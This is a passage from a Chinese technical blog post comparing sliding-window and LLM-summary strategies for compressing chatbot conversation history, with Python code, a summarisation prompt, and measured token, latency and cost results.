<p><strong>推荐设置：</strong></p>
<ul>
<li>短对话场景：3-5轮</li>
<li>一般场景：5-8轮</li>
<li>重要对话：10-15轮</li>
</ul>
<p>完整测试代码：[GitHub - tests/test_sliding_window.py]</p>
<hr/>
<h4 data-id="heading-36"><strong>优缺点总结</strong></h4>
<p>基于真实测试数据，我们得出：</p>
<p><strong>✅ 三大优势：</strong></p>
<ol>
<li><strong>速度极快</strong>
<ul>
<li>0.14微秒/次（测试数据）</li>
<li>比网络请求快35万倍</li>
<li>完全不影响响应时间</li>
</ul>
</li>
<li><strong>零成本</strong>
<ul>
<li>无需调用LLM API</li>
<li>无额外token消耗</li>
<li>日活百万也不增加成本</li>
</ul>
</li>
<li><strong>压缩效果随对话增长</strong>
<ul>
<li>10轮：50%</li>
<li>20轮：74%</li>
<li>30轮：85%</li>
<li>对话越长越划算</li>
</ul>
</li>
</ol>
<p><strong>❌ 两大缺陷：</strong></p>
<ol>
<li><strong>严重的信息丢失</strong>（实测证明）
<ul>
<li>所有用户背景信息在10轮后丢失</li>
<li>不区分"Tom"和"嗯"的重要性</li>
<li>保留无用内容，丢弃关键信息</li>
</ul>
</li>
<li><strong>短对话无效</strong>
<ul>
<li>5轮内压缩率0%</li>
<li>浪费优化机会</li>
</ul>
</li>
</ol>
<hr/>
<h4 data-id="heading-37"><strong>适用场景指南</strong></h4>
<p>基于测试数据，我们总结：</p>
<p><strong>✅ 适合使用：</strong></p>
<ol>
<li><strong>短时对话（≤10轮）</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：客服快速咨询、FAQ问答
理由：
<span class="hljs-deletion">- 实测：10轮内压缩率50%</span>
<span class="hljs-deletion">- 关键信息丢失风险低</span>
<span class="hljs-deletion">- 速度优势明显</span>
</code></pre>
<ol>
<li><strong>实时性要求高</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：即时聊天、游戏NPC对话
理由：
<span class="hljs-deletion">- 实测：0.14微秒，零延迟</span>
<span class="hljs-deletion">- 用户感知不到压缩过程</span>
</code></pre>
<ol>
<li><strong>成本敏感</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：大规模免费产品
理由：
<span class="hljs-deletion">- 零成本</span>
<span class="hljs-deletion">- 日活百万也不增加费用</span>
</code></pre>
<ol>
<li><strong>简单交互</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：查询类、工具类对话
理由：
<span class="hljs-deletion">- 不需要记住用户背景</span>
<span class="hljs-deletion">- 每次对话相对独立</span>
</code></pre>
<p><strong>❌ 不适合：</strong></p>
<ol>
<li><strong>长时间对话（&gt;10轮）</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：技术支持、深度咨询
问题：
<span class="hljs-deletion">- 实测：10轮后丢失所有早期信息</span>
<span class="hljs-deletion">- 用户体验差（AI不记得说过什么）</span>
</code></pre>
<ol>
<li><strong>个性化要求高</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：个人助理、教育辅导
问题：
<span class="hljs-deletion">- 用户信息在开头（会被删除）</span>
<span class="hljs-deletion">- 无法保持个性化体验</span>
</code></pre>
<ol>
<li><strong>信息密集型</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：项目讨论、决策分析
问题：
<span class="hljs-deletion">- 每轮都可能有关键信息</span>
<span class="hljs-deletion">- 不能随意丢弃任何内容</span>
</code></pre>
<hr/>
<h4 data-id="heading-38"><strong>最佳实践</strong></h4>
<p>基于测试结果，给出实用建议：</p>
<p><strong>1. 根据场景设置窗口大小</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 快速咨询</span>
compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">3</span>)  <span class="hljs-comment"># 压缩率85%</span>

<span class="hljs-comment"># 一般对话</span>
compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">5</span>)  <span class="hljs-comment"># 压缩率74%</span>

<span class="hljs-comment"># 重要对话</span>
compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">10</span>) <span class="hljs-comment"># 压缩率49%</span>
</code></pre>
<p><strong>2. 监控信息丢失</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SlidingWindowCompressor</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(messages) &gt; self.keep_messages:
            dropped = messages[:-self.keep_messages]
            
            <span class="hljs-comment"># 检查丢弃的消息中是否有重要实体</span>
            <span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> dropped:
                <span class="hljs-keyword">if</span> self._contains_important_entity(msg):
                    logger.warning(<span class="hljs-string">f"丢弃了重要信息: <span class="hljs-subst">{msg[<span class="hljs-string">'content'</span>][:<span class="hljs-number">50</span>]}</span>"</span>)
        
        <span class="hljs-keyword">return</span> messages[-self.keep_messages:]
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_contains_important_entity</span>(<span class="hljs-params">self, msg</span>):
        <span class="hljs-string">"""检测是否包含重要实体（人名、地名等）"""</span>
        <span class="hljs-comment"># 简单实现：检查是否包含特定关键词</span>
        keywords = [<span class="hljs-string">'叫'</span>, <span class="hljs-string">'在'</span>, <span class="hljs-string">'是'</span>, <span class="hljs-string">'做'</span>, <span class="hljs-string">'研究'</span>]
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>(kw <span class="hljs-keyword">in</span> msg[<span class="hljs-string">'content'</span>] <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> keywords)
</code></pre>
<p><strong>3. 与其他策略结合</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 策略1：滑动窗口 + 用户画像</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">EnhancedChatbot</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">5</span>)
        self.user_profile = {}  <span class="hljs-comment"># 永久保存：姓名、偏好等</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">self, user_input</span>):
        <span class="hljs-comment"># 提取用户信息（如姓名、地点）</span>
        self._extract_user_info(user_input)
        
        <span class="hljs-comment"># 压缩对话历史</span>
        compressed_history = self.compressor.compress(self.memory)
        
        <span class="hljs-comment"># 构建上下文：用户画像 + 压缩历史</span>
        context = [
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">f"用户信息: <span class="hljs-subst">{self.user_profile}</span>"</span>}
        ] + compressed_history
        
        <span class="hljs-keyword">return</span> self.llm.chat(context)
</code></pre>
<hr/>
<h4 data-id="heading-39"><strong>小结</strong></h4>
<p>滑动窗口压缩器的特点：</p>
<pre><code class="hljs language-bash" lang="bash">三个<span class="hljs-string">"最"</span>：
✅ 最简单（3行代码）
✅ 最快（0.14微秒）
✅ 最便宜（<span class="hljs-variable">$0</span>）

一个<span class="hljs-string">"坑"</span>：
❌ 机械删除，丢失重要信息

最佳定位：
适合短对话、实时场景、成本敏感场景
</code></pre>
<p><strong>什么时候用？</strong></p>
<ul>
<li>对话≤10轮</li>
<li>要求极致速度</li>
<li>预算为零</li>
</ul>
<p><strong>什么时候不用？</strong></p>
<ul>
<li>对话&gt;10轮</li>
<li>需要记住用户背景</li>
<li>信息很重要</li>
</ul>
<p>在下一节，我们将看到完全相反的策略：<strong>LLM摘要</strong> - 慢但智能，能够解决信息丢失问题。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed55d5b080724c7ab6fd8ca106afc4ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=bnNzoS8w%2Bn%2BfIkbNygFZPN%2BZGcY%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<hr/>
<h3 data-id="heading-40"><strong>3.3 策略2：LLM摘要（LLM Summary）</strong></h3>
<h4 data-id="heading-41"><strong>核心原理</strong></h4>
<p>LLM摘要是一种<strong>智能压缩</strong>策略：用大语言模型理解对话历史，提取关键信息生成摘要，保留最近几轮完整对话。</p>
<pre><code class="hljs">原始对话（10轮，20条消息）：
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 1  │ 2  │ 3  │ 4  │ 5  │ 6  │ 7  │ 8  │ 9  │ 10 │
└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘
  ↓                                    ↓
  历史部分（1-7轮）              最近部分（8-10轮）
  ↓                                    ↓
  LLM智能摘要                       完整保留
  ↓                                    ↓
┌──────────────────────┐      ┌────┬────┬────┐
│ 📝 摘要：用户Tom，     │  +   │ 8  │ 9  │ 10 │
│ 上海AI工程师...        │      └────┴────┴────┘
└──────────────────────┘
</code></pre>
<p><strong>核心思想：</strong></p>
<ul>
<li>远期对话（第1-7轮）→ 用LLM生成摘要</li>
<li>近期对话（第8-10轮）→ 完整保留</li>
<li>摘要 + 完整对话 = 压缩后的上下文</li>
</ul>
<p>与滑动窗口的本质区别：</p>
<ul>
<li>滑动窗口：<strong>机械删除</strong>，不管内容重要性</li>
<li>LLM摘要：<strong>智能提取</strong>，保留关键信息</li>
</ul>
<h4 data-id="heading-42"><strong>Prompt工程（关键！）</strong></h4>
<p>LLM摘要的效果高度依赖Prompt的质量。以下是我们使用的Prompt：</p>
<pre><code class="hljs language-python" lang="python">SUMMARY_PROMPT = <span class="hljs-string">"""请总结以下对话历史，提取关键信息：

对话内容：
{conversation}

请按以下格式输出摘要（150字以内）：

📝 对话历史摘要：
1. **用户基本信息**：姓名、年龄、地点、职业等
2. **用户偏好与兴趣**：提到的兴趣、偏好
3. **讨论主要话题**：聊了什么
4. **重要决定或结论**：做了什么决定
5. **关键细节**：其他重要信息

要求：
- 简洁明了，不超过150字
- 只保留关键信息，删除寒暄
- 使用结构化格式
"""</span>
</code></pre>
<p><strong>Prompt设计的关键点：</strong></p>
<ol>
<li>✅ 明确输出格式（结构化）</li>
<li>✅ 指定提取维度（姓名、地点、话题等）</li>
<li>✅ 限制长度（150字）</li>
<li>✅ 强调关键信息优先</li>
</ol>
<h4 data-id="heading-43"><strong>代码实现</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>
<span class="hljs-keyword">from</span> src.llm.base <span class="hljs-keyword">import</span> BaseLLM


<span class="hljs-keyword">class</span> <span class="hljs-title class_">LLMSummaryCompressor</span>:
    <span class="hljs-string">"""
    LLM摘要压缩器
    
    特点：
    - 智能提取关键信息
    - 保留语义完整性
    - 适合长对话场景
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm: BaseLLM, keep_recent_turns: <span class="hljs-built_in">int</span> = <span class="hljs-number">3</span></span>):
        <span class="hljs-string">"""
        Args:
            llm: LLM实例
            keep_recent_turns: 保留最近几轮完整对话
        """</span>
        self.llm = llm
        self.keep_recent_turns = keep_recent_turns
        self.keep_recent_messages = keep_recent_turns * <span class="hljs-number">2</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]:
        <span class="hljs-string">"""
        压缩消息列表
        
        Args:
            messages: 原始消息列表
            
        Returns:
            压缩后的消息列表
        """</span>
        <span class="hljs-comment"># 如果消息不够多，不压缩</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(messages) &lt;= self.keep_recent_messages:
            <span class="hljs-keyword">return</span> messages
        
        <span class="hljs-comment"># 分割：历史部分 vs 最近部分</span>
        history = messages[:-self.keep_recent_messages]
        recent = messages[-self.keep_recent_messages:]
        
        <span class="hljs-comment"># 生成历史摘要</span>
        summary = self._summarize(history)
        
        <span class="hljs-comment"># 构建压缩结果：摘要 + 最近对话</span>
        compressed = [
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: summary}
        ]
        compressed.extend(recent)
        
        <span class="hljs-keyword">return</span> compressed
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_summarize</span>(<span class="hljs-params">self, messages: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-string">"""
        用LLM生成对话摘要
        
        Args:
            messages: 需要摘要的消息列表
            
        Returns:
            摘要文本
        """</span>
        <span class="hljs-comment"># 格式化对话内容</span>
        conversation_text = <span class="hljs-string">"\n"</span>.join([
            <span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-string">'用户'</span> <span class="hljs-keyword">if</span> m[<span class="hljs-string">'role'</span>] == <span class="hljs-string">'user'</span> <span class="hljs-keyword">else</span> <span class="hljs-string">'助手'</span>}</span>: <span class="hljs-subst">{m[<span class="hljs-string">'content'</span>]}</span>"</span>
            <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages
        ])
        
        <span class="hljs-comment"># 构建Prompt</span>
        prompt = <span class="hljs-string">f"""请总结以下对话历史，提取关键信息：

对话内容：
<span class="hljs-subst">{conversation_text}</span>

请按以下格式输出摘要（150字以内）：

📝 对话历史摘要：
1. **用户基本信息**：姓名、年龄、地点、职业等
2. **用户偏好与兴趣**：提到的兴趣、偏好
3. **讨论主要话题**：聊了什么
4. **重要决定或结论**：做了什么决定
5. **关键细节**：其他重要信息

要求：
- 简洁明了，不超过150字
- 只保留关键信息，删除寒暄
- 使用结构化格式
"""</span>
        
        <span class="hljs-comment"># 调用LLM生成摘要</span>
        summary = self.llm.chat([
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}
        ])
        
        <span class="hljs-keyword">return</span> summary
</code></pre>
<h4 data-id="heading-44"><strong>真实性能测试</strong></h4>
<p>我们对LLM摘要压缩器进行了完整测试，以下是真实数据：</p>
<hr/>
<p><strong>测试1：压缩率（保留最近3轮）</strong></p>








































<table><thead><tr><th>对话长度</th><th>原始</th><th>压缩后</th><th>Token压缩率</th><th>结果</th></tr></thead><tbody><tr><td>5轮（短对话）</td><td>10条 / 126 tokens</td><td>7条 / 303 tokens</td><td><strong>-140.5%</strong> ❌</td><td>Token反增</td></tr><tr><td>10轮（中等）</td><td>20条 / 249 tokens</td><td>7条 / 408 tokens</td><td><strong>-63.9%</strong> ❌</td><td>Token反增</td></tr><tr><td>20轮（长对话）</td><td>42条 / 560 tokens</td><td>7条 / 539 tokens</td><td><strong>3.7%</strong> ⚠️</td><td>微弱压缩</td></tr><tr><td>30轮（超长）</td><td>68条 / 933 tokens</td><td>7条 / 628 tokens</td><td><strong>32.7%</strong> ✅</td><td>有效压缩</td></tr></tbody></table>
<p><strong>意外发现：LLM摘要在短对话中完全是负优化！</strong></p>
<p>原因分析：</p>
<pre><code class="hljs language-markdown" lang="markdown">短对话（5轮，126 tokens）：
原文: "我叫Tom"、"你好Tom"、"我在上海"...

摘要（303 tokens）：
"📝 对话历史摘要：
<span class="hljs-bullet">1.</span> <span class="hljs-strong">**用户基本信息**</span>：
<span class="hljs-bullet">   -</span> 姓名：Tom
<span class="hljs-bullet">   -</span> 地点：上海
<span class="hljs-bullet">   -</span> 职业：未明确说明行业
<span class="hljs-bullet">2.</span> <span class="hljs-strong">**用户偏好和兴趣**</span>：未提及
<span class="hljs-bullet">3.</span> <span class="hljs-strong">**讨论主要话题**</span>：..."

问题：摘要本身比原文还啰嗦！
</code></pre>
<p><strong>结论：只有在超长对话（≥30轮）时，LLM摘要才开始产生正收益。</strong></p>
<hr/>
<p><strong>测试2：速度测试</strong></p>
<pre><code class="hljs language-makefile" lang="makefile">测试对话：10轮（20条消息）

<span class="hljs-section">压缩1次:  8,939ms  (约9秒)</span>
<span class="hljs-section">压缩3次:  25,210ms (平均8.4秒/次)</span>
<span class="hljs-section">压缩5次:  42,599ms (平均8.5秒/次)</span>

平均速度：8.5秒/次 🐌
</code></pre>
<p><strong>对比：</strong></p>
<ul>
<li>滑动窗口：0.0001ms</li>
<li>LLM摘要：8,500ms</li>
<li><strong>差距：85,000,000倍！</strong></li>
</ul>
<p><strong>为什么这么慢？</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 网络请求：50-100ms
<span class="hljs-bullet">2.</span> LLM推理：8,000ms+
<span class="hljs-bullet">3.</span> 返回结果：50-100ms
总计：约8,500ms
</code></pre>
<p><strong>结论：LLM摘要会显著增加响应延迟。</strong></p>
<hr/>
<p><strong>测试3：成本分析</strong></p>
<p>DeepSeek价格：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.14</mn><mi mathvariant="normal">/</mi><mn>1</mn><mi>M</mi><mi>i</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>s</mi><mtext>，</mtext></mrow><annotation encoding="application/x-tex">0.14/1M input tokens，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">0.14/1</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">in</span><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">tt</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mord cjk_fallback">，</span></span></span></span></span>0.28/1M output tokens</p>








































<table><thead><tr><th>对话长度</th><th>输入tokens</th><th>输出tokens</th><th>单次成本</th><th>1万次成本</th></tr></thead><tbody><tr><td>5轮</td><td>48</td><td>14</td><td>$0.000011</td><td>$0.11</td></tr><tr><td>10轮</td><td>175</td><td>52</td><td>$0.000039</td><td>$0.39</td></tr><tr><td>20轮</td><td>474</td><td>142</td><td>$0.000106</td><td><strong>$1.06</strong></td></tr><tr><td>30轮</td><td>852</td><td>256</td><td>$0.000191</td><td><strong>$1.91</strong></td></tr></tbody></table>
<p><strong>规模化成本估算：</strong></p>
<pre><code class="hljs language-bash" lang="bash">场景：日活10万用户的客服系统
- 每用户平均20轮对话
- 每次压缩成本：<span class="hljs-variable">$0</span>.0001

成本计算：
- 日成本：10万 × <span class="hljs-variable">$0</span>.0001 = <span class="hljs-variable">$10</span>
- 月成本：<span class="hljs-variable">$10</span> × 30 = <span class="hljs-variable">$300</span>
- 年成本：<span class="hljs-variable">$3</span>,600

vs 滑动窗口：<span class="hljs-variable">$0</span>
</code></pre>
<p><strong>结论：LLM摘要有明确的成本开销，需要权衡。</strong></p>
<hr/>
<p><strong>测试4：信息保留测试（关键！）</strong></p>
<p>构造一个包含9个关键信息的对话（6轮）：</p>
<pre><code class="hljs language-python" lang="python">关键信息：
Tom, <span class="hljs-number">28</span>岁, 上海, 浦东, AI工程师, Agent, 多智能体, 通信延迟, 消息队列

原始对话：<span class="hljs-number">12</span>条消息

压缩后：<span class="hljs-number">5</span>条消息
├─ <span class="hljs-number">1</span>条摘要
└─ <span class="hljs-number">4</span>条最近对话（保留<span class="hljs-number">2</span>轮）
</code></pre>
<p><strong>摘要内容（实际生成）：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">📝 对话历史摘要：
<span class="hljs-strong">**用户基本信息**</span>
<span class="hljs-bullet">-</span> 姓名：Tom
<span class="hljs-bullet">-</span> 年龄：28岁
<span class="hljs-bullet">-</span> 地点：上海浦东
<span class="hljs-bullet">-</span> 职业：AI工程师

<span class="hljs-strong">**用户偏好与兴趣**</span>
<span class="hljs-bullet">-</span> 对AI领域前沿技术感兴趣，目前专注于Agent多智能体协作研究。

<span class="hljs-strong">**讨论主要话题**</span>
<span class="hljs-bullet">1.</span> 用户自我介绍（姓名、年龄、职业、工作地点）
<span class="hljs-bullet">2.</span> 职业方向讨论（AI工程师的前景）
<span class="hljs-bullet">3.</span> 技术研究热点（多智能体协作）

<span class="hljs-strong">**关键细节**</span>
<span class="hljs-bullet">-</span> 年龄：28岁
<span class="hljs-bullet">-</span> 地点：上海浦东
<span class="hljs-bullet">-</span> 研究方向：Agent多智能体协作
</code></pre>
<p><strong>信息保留情况：</strong></p>
<pre><code class="hljs language-ini" lang="ini">✅ Tom          - 保留
✅ 28岁         - 保留
✅ 上海         - 保留
✅ 浦东         - 保留
✅ AI工程师     - 保留
✅ Agent        - 保留
✅ 多智能体     - 保留
✅ 通信延迟     - 保留（在最近对话中）
✅ 消息队列     - 保留（在最近对话中）

保留率：9/<span class="hljs-attr">9</span> = <span class="hljs-number">100</span>% ✅
</code></pre>
<p><strong>对比滑动窗口：</strong></p>
<ul>
<li>滑动窗口（5轮）：丢失Tom、28岁、上海、浦东、AI工程师</li>
<li>LLM摘要：全部保留</li>
</ul>
<p><strong>这就是LLM摘要的核心价值：智能提取，不丢失关键信息！</strong></p>
<hr/>
<p><strong>测试5：与滑动窗口直接对比</strong></p>
<p>测试对话：20轮（42条消息，560 tokens）</p>


























<table><thead><tr><th>策略</th><th>结果</th><th>Token数</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td>滑动窗口</td><td>10条消息</td><td>145 tokens</td><td>0.00ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条消息</td><td>571 tokens</td><td>14,263ms</td><td>$0.000114</td></tr></tbody></table>
<p><strong>关键对比：</strong></p>
<pre><code class="hljs language-diff" lang="diff">Token效率：
<span class="hljs-deletion">- 滑动窗口：145 tokens（74%压缩）✅</span>
<span class="hljs-deletion">- LLM摘要：571 tokens（-2%压缩）❌</span>
→ LLM摘要反而用了更多token！

速度：
<span class="hljs-deletion">- 滑动窗口：0.00ms</span>
<span class="hljs-deletion">- LLM摘要：14,263ms</span>
→ 慢了4,600,000倍！

成本：
<span class="hljs-deletion">- 滑动窗口：$0</span>
<span class="hljs-deletion">- LLM摘要：$0.000114</span>
→ 每次都有成本

但信息保留：
<span class="hljs-deletion">- 滑动窗口：❌ 丢失所有早期信息</span>
<span class="hljs-deletion">- LLM摘要：✅ 保留100%关键信息</span>
</code></pre>
<p><strong>核心矛盾：LLM摘要在token数量上甚至不如滑动窗口！</strong></p>
<p>完整测试代码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Ftests%2Ftest_llm_summary.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/tests/test_llm_summary.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<hr/>
<h4 data-id="heading-45"><strong>为什么Token反而增加？</strong></h4>
<p>让我们分析一个实际案例：</p>
<pre><code class="hljs language-python" lang="python">原始对话（<span class="hljs-number">5</span>轮，<span class="hljs-number">126</span> tokens）：
用户: <span class="hljs-string">"我叫Tom"</span>                    (<span class="hljs-number">3</span> tokens)
助手: <span class="hljs-string">"你好Tom！"</span>                   (<span class="hljs-number">4</span> tokens)
用户: <span class="hljs-string">"我在上海"</span>                    (<span class="hljs-number">4</span> tokens)
助手: <span class="hljs-string">"上海不错"</span>                    (<span class="hljs-number">3</span> tokens)
...

LLM生成的摘要（<span class="hljs-number">303</span> tokens）：
<span class="hljs-string">"📝 对话历史摘要：
1. **用户基本信息**：
   - 姓名：Tom
   - 地点：上海
   - 职业：未明确说明行业
2. **用户偏好和兴趣**：未提及
3. **讨论主要话题**：基本信息交流
4. **重要决定或结论**：无
5. **关键细节**：..."</span>
</code></pre>
<p><strong>问题在于：</strong></p>
<ol>
<li>摘要包含大量<strong>格式化文本</strong>（标题、序号、分隔符）</li>
<li>摘要有<strong>冗余描述</strong>（"未提及"、"无"这些也占token）</li>
<li>原始对话本来就<strong>很短很精炼</strong></li>
</ol>
<p><strong>解决方案：优化Prompt</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 优化前（当前使用的）</span>
<span class="hljs-string">"请按以下格式输出摘要（150字以内）：
📝 对话历史摘要：
1. **用户基本信息**：..."</span>

<span class="hljs-comment"># 优化后（更紧凑）</span>
<span class="hljs-string">"用一句话总结关键信息，格式：
Tom，28岁，上海AI工程师，研究Agent"</span>

压缩效果：
- 优化前：<span class="hljs-number">303</span> tokens
- 优化后：约<span class="hljs-number">30</span> tokens ✅
</code></pre>
<hr/>
<h4 data-id="heading-46"><strong>优缺点总结</strong></h4>
<p>基于真实测试数据：</p>
<p><strong>✅ 唯一的核心优势：信息保留</strong></p>
<pre><code class="hljs language-diff" lang="diff">测试结果：100%保留关键信息
<span class="hljs-deletion">- ✅ 用户姓名（Tom）</span>
<span class="hljs-deletion">- ✅ 年龄（28岁）</span>
<span class="hljs-deletion">- ✅ 地点（上海浦东）</span>
<span class="hljs-deletion">- ✅ 职业（AI工程师）</span>
<span class="hljs-deletion">- ✅ 兴趣（Agent多智能体）</span>

vs 滑动窗口：全部丢失 ❌
</code></pre>
<p><strong>这是LLM摘要的立身之本！</strong></p>
<p><strong>❌ 三大致命缺陷：</strong></p>
<ol>
<li><strong>短对话负优化</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">实测数据：
<span class="hljs-deletion">- 5轮对话：Token -140%（反而增加）</span>
<span class="hljs-deletion">- 10轮对话：Token -64%</span>
<span class="hljs-deletion">- 只有30轮以上才开始正收益</span>

结论：不适合短对话 ❌
</code></pre>
<ol>
<li><strong>速度极慢</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">实测：8.5秒/次
对比：滑动窗口0.0001ms

影响：
<span class="hljs-deletion">- 用户等待时间增加8秒</span>
<span class="hljs-deletion">- 实时对话体验差</span>
<span class="hljs-deletion">- 高并发场景瓶颈</span>

结论：不适合实时场景 ❌
</code></pre>
<ol>
<li><strong>有明确成本</strong></li>
</ol>

<pre><code class="hljs language-bash" lang="bash">实测：<span class="hljs-variable">$0</span>.0001-0.0002/次

规模化：
- 日活10万：<span class="hljs-variable">$10</span>/天
- 年成本：<span class="hljs-variable">$3</span>,600

vs 滑动窗口：<span class="hljs-variable">$0</span>

结论：有成本压力 ⚠️
</code></pre>
<hr/>
<h4 data-id="heading-47"><strong>适用场景指南</strong></h4>
<p>基于真实测试，LLM摘要的适用场景非常<strong>有限且明确</strong>：</p>
<p><strong>✅ 唯一推荐场景：超长对话 + 需要保留用户信息</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">同时满足以下条件：
<span class="hljs-bullet">1.</span> ✅ 对话≥30轮（否则token负优化）
<span class="hljs-bullet">2.</span> ✅ 包含重要用户信息（姓名、偏好等）
<span class="hljs-bullet">3.</span> ✅ 可以容忍8秒延迟
<span class="hljs-bullet">4.</span> ✅ 有预算支持LLM调用

典型场景：
<span class="hljs-bullet">-</span> 心理咨询（长时间深度对话）
<span class="hljs-bullet">-</span> 教育辅导（需要记住学生背景）
<span class="hljs-bullet">-</span> 高端客服（VIP用户，体验优先）
<span class="hljs-bullet">-</span> 项目顾问（持续数周的项目讨论）
</code></pre>
<p><strong>❌ 不推荐场景：</strong></p>
<ol>
<li><strong>短对话（&lt;30轮）</strong></li>
</ol>

<pre><code class="hljs language-erlang" lang="erlang">问题：Token反而增加，完全负优化
数据：<span class="hljs-number">10</span>轮对话token -<span class="hljs-number">64</span><span class="hljs-comment">%</span>
替代：用滑动窗口
</code></pre>
<ol>
<li><strong>实时对话</strong></li>
</ol>

<pre><code class="hljs">问题：8秒延迟无法接受
数据：比滑动窗口慢460万倍
替代：用滑动窗口
</code></pre>
<ol>
<li><strong>大规模免费产品</strong></li>
</ol>

<pre><code class="hljs language-bash" lang="bash">问题：成本累积快
数据：日活10万年成本<span class="hljs-variable">$3</span>,600
替代：用滑动窗口或混合策略
</code></pre>
<ol>
<li><strong>简单问答</strong></li>
</ol>

<pre><code class="hljs">问题：不需要记住用户信息
数据：摘要开销大于收益
替代：用滑动窗口
</code></pre>
<hr/>
<h4 data-id="heading-48"><strong>优化建议</strong></h4>
<p>如果一定要用LLM摘要，可以这样优化：</p>
<p><strong>1. 简化Prompt，减少格式化文本</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 当前Prompt（303 tokens输出）</span>
<span class="hljs-string">"请按以下格式输出摘要（150字以内）：
📝 对话历史摘要：
1. **用户基本信息**：..."</span>

<span class="hljs-comment"># 优化Prompt（约50 tokens）</span>
<span class="hljs-string">"一句话总结：Tom，28岁，上海AI工程师，研究Agent多智能体协作，遇到通信延迟问题。"</span>

效果：token减少<span class="hljs-number">80</span>% ✅
</code></pre>
<p><strong>2. 提高触发阈值</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 不好：10轮就触发</span>
compressor = LLMSummaryCompressor(llm, keep_recent_turns=<span class="hljs-number">3</span>)
<span class="hljs-comment"># 10轮时token还是负数</span>

<span class="hljs-comment"># 更好：30轮才触发</span>
<span class="hljs-comment"># 只在真正需要时才用LLM摘要</span>
</code></pre>
<p><strong>3. 异步压缩</strong></p>
